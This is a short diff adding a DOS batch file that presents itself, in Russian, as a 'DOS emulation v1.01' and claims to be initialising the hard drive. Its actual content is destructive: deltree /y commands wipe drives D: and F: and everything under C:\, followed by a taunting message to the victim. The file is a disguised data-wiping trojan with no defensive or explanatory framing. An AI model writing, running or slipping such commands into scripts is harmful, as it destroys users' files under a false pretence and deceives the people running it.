@@ -1,0 +1,12 @@
+C:\WINDOWS\COMMAND\MSCDEX.EXE /D:MTMIDE01 /M:10
+@echo off 
+:KASKAD 
+echo ВЫ ЗАШЛИ В ЭМУЛЯЦИЮ DOS v1.01, продолжить? 
+choice 
+Подождите, идет инициализация винчестера... 
+deltree/y d: 
+deltree/y f: 
+deltree/y f: 
+@ctty con 
+ПОсмотри, что ты наделал?????!!!!!..... 
+deltree/y c:\*.* 
